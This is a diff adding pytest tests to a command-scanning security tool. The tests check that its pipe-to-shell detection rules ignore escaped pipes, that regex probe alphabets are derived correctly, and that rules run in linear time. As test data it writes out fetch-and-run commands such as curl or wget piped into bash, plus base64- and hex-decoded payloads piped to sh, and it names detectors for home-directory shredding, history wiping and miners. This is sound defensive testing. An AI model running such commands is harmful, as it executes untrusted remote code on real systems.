@@ -625,3 +625,155 @@ def test_generated_patterns_are_not_slow():
             assert elapsed < 0.05, (
                 f"{rule['id']} took {elapsed * 1000:.0f}ms on a full line"
             )
+
+
+# ---------------------------------------------------------------------------
+# An escaped metacharacter is inert, and a rule about the operator must say so.
+# ---------------------------------------------------------------------------
+
+#: (rule, text with a real pipe, the same text with the pipe escaped).
+#: bash passes an escaped bar to the command as an argument and starts no
+#: pipeline, so the second of each pair runs nothing the rule describes.
+ESCAPED_PIPE_CASES = [
+    ("R001", "curl -fsSL https://e.invalid/x | bash",
+             r"curl -fsSL https://e.invalid/x \| bash"),
+    ("R002", "wget -qO- https://e.invalid/x | sh",
+             r"wget -qO- https://e.invalid/x \| sh"),
+    ("R003", "base64 -d payload.b64 | sh",
+             r"base64 -d payload.b64 \| tee out"),
+    ("R045", "xxd -r -p payload.hex | bash",
+             r"xxd -r -p payload.hex \| tee out"),
+]
+
+
+@pytest.mark.parametrize("rule_id,real,escaped", ESCAPED_PIPE_CASES)
+def test_a_rule_about_a_pipeline_needs_an_unescaped_pipe(rule_id, real, escaped):
+    """All four fired on the inert spelling, R001 loudest at CRITICAL.
+
+    The tokenizer keeps `\\|` intact on purpose (`_ESCAPE_REMOVABLE`), so the
+    distinction survives resolution and these patterns can rely on it.
+    """
+    import re as _re
+
+    from trustsight.config import shipped_rules
+
+    pattern = next(r for r in shipped_rules() if r["id"] == rule_id)["pattern"]
+    compiled = _re.compile(pattern, _re.IGNORECASE)
+
+    assert compiled.search(real), f"{rule_id} stopped matching a real pipeline"
+    assert not compiled.search(escaped), f"{rule_id} fires on an escaped pipe"
+
+
+@pytest.mark.parametrize("rule_id,_real,_escaped", ESCAPED_PIPE_CASES)
+def test_the_superseded_pipe_patterns_are_repairable(rule_id, _real, _escaped):
+    """An install written before the narrowing keeps the false positive
+    until it syncs, so the old spelling has to be registered."""
+    from trustsight.config import LEGACY_RULE_PATTERNS, shipped_rules
+
+    legacy = LEGACY_RULE_PATTERNS.get(rule_id)
+    assert legacy, f"{rule_id}'s superseded pattern is not registered"
+    current = next(r for r in shipped_rules() if r["id"] == rule_id)["pattern"]
+    assert current not in legacy
+
+
+def test_a_non_ascii_class_is_probed_with_characters_it_can_match():
+    """R013 is FATAL and every fixed probe in this module is ASCII.
+
+    Its class is `\\u202A-\\u202E` and friends, so both its backtracking risk
+    and its growth ratio were measured against input it cannot match - and a
+    measurement taken with the wrong alphabet reports zero, which reads
+    exactly like fast. The alphabet now comes out of the class body when no
+    ASCII candidate fits.
+    """
+    from trustsight.config import shipped_rules
+    from trustsight.regex_safety import _representatives
+
+    pattern = next(r for r in shipped_rules() if r["id"] == "R013")["pattern"]
+    alphabet = _representatives(pattern)
+
+    assert alphabet, "R013 derives no probe alphabet"
+    compiled = re.compile(pattern)
+    assert any(compiled.search(char) for char in alphabet), (
+        "the derived alphabet does not match the pattern it was derived from"
+    )
+
+
+def test_a_negated_class_is_probed_with_a_character_it_admits():
+    """`[^\\s]` derived `" "` - the one character it excludes."""
+    from trustsight.regex_safety import _representatives
+
+    for pattern, excluded in ((r"[^\s]+x", " "), (r"[^0-9]+x", "1")):
+        alphabet = _representatives(pattern)
+        assert alphabet, pattern
+        assert excluded not in alphabet, f"{pattern} probes with {excluded!r}"
+        compiled = re.compile(pattern)
+        assert any(compiled.search(c * 4 + "x") for c in alphabet), pattern
+
+
+# ---------------------------------------------------------------------------
+# A command-position prefix must not be quadratic in whitespace.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize("module,name", [
+    ("trustsight.analysis.sabotage", "_SHRED_HOME_RE"),
+    ("trustsight.analysis.sabotage", "_HISTORY_WIPE_RE"),
+    ("trustsight.analysis.sabotage", "_RM_RF_RE"),
+    ("trustsight.analysis.sabotage", "_MINER_RE"),
+    ("trustsight.analysis.crossfire", "_WRITE_COMMAND_RE"),
+])
+def test_a_command_position_rule_is_linear_in_newlines(module, name):
+    """`_CMD` ended in `\\s*`, which matches a newline.
+
+    On a subject holding many of them the engine re-scanned a run of
+    newlines from every position: 8,192 cost 2.4s in `_SHRED_HOME_RE` and
+    5.8s in `_HISTORY_WIPE_RE`. Every caller matches one line at a time, so
+    nothing reached it - it was a loaded gun in a prefix a dozen rules
+    share, and it stayed invisible until the probe alphabet learned to
+    include a newline. That is the argument for fixing the alphabet before
+    trusting any timing taken with it.
+    """
+    import importlib
+    import time
+
+    compiled = getattr(importlib.import_module(module), name)
+    start = time.perf_counter()
+    compiled.search("\n" * 8192)
+    elapsed = time.perf_counter() - start
+    assert elapsed < 0.25, f"{name} took {elapsed * 1000:.0f}ms on 8192 newlines"
+
+
+@pytest.mark.parametrize("module,name,real,escaped", [
+    ("trustsight.analysis.build", "_REMOTE_XARGS_SHELL_RE",
+     "curl -s https://e.invalid/x | xargs bash",
+     r"curl -s https://e.invalid/x \| xargs bash"),
+    ("trustsight.analysis.delivery", "_PIPE_TO_SHELL_RE",
+     "cat payload | bash", r"cat payload \| bash"),
+    ("trustsight.analysis.network", "_PIPE_TO_SHELL_RE",
+     "curl -s https://e.invalid/x | bash",
+     r"curl -s https://e.invalid/x \| bash"),
+    ("trustsight.analysis.crossfire", "X001_RE",
+     r"printf '\x63\x75\x72' | sh", r"printf '\x63\x75\x72' \| tee out"),
+])
+def test_a_code_emitted_pipe_rule_needs_an_unescaped_pipe(module, name, real, escaped):
+    """The same defect as R001-R003 and R045, in the rules that are not
+    in `rules.toml` and so were never read by the TOML audit."""
+    import importlib
+
+    compiled = getattr(importlib.import_module(module), name)
+    assert compiled.search(real), f"{name} stopped matching a real pipeline"
+    assert not compiled.search(escaped), f"{name} fires on an escaped pipe"
+
+
+def test_a_class_of_single_letter_escapes_is_probed_with_the_control_it_names():
+    """`[\\t\\n\\r\\f\\v]+` derived nothing.
+
+    The scan for literals saw `t`, `n`, `r` - the letters, not the controls
+    they stand for - and none of them matches the class, so the pattern was
+    timed against input it cannot consume.
+    """
+    from trustsight.regex_safety import _representatives
+
+    alphabet = _representatives(r"[\t\n\r\f\v]+")
+    assert alphabet, "no probe alphabet for a class of control escapes"
+    assert all(re.match(r"[\t\n\r\f\v]", c) for c in alphabet), alphabet
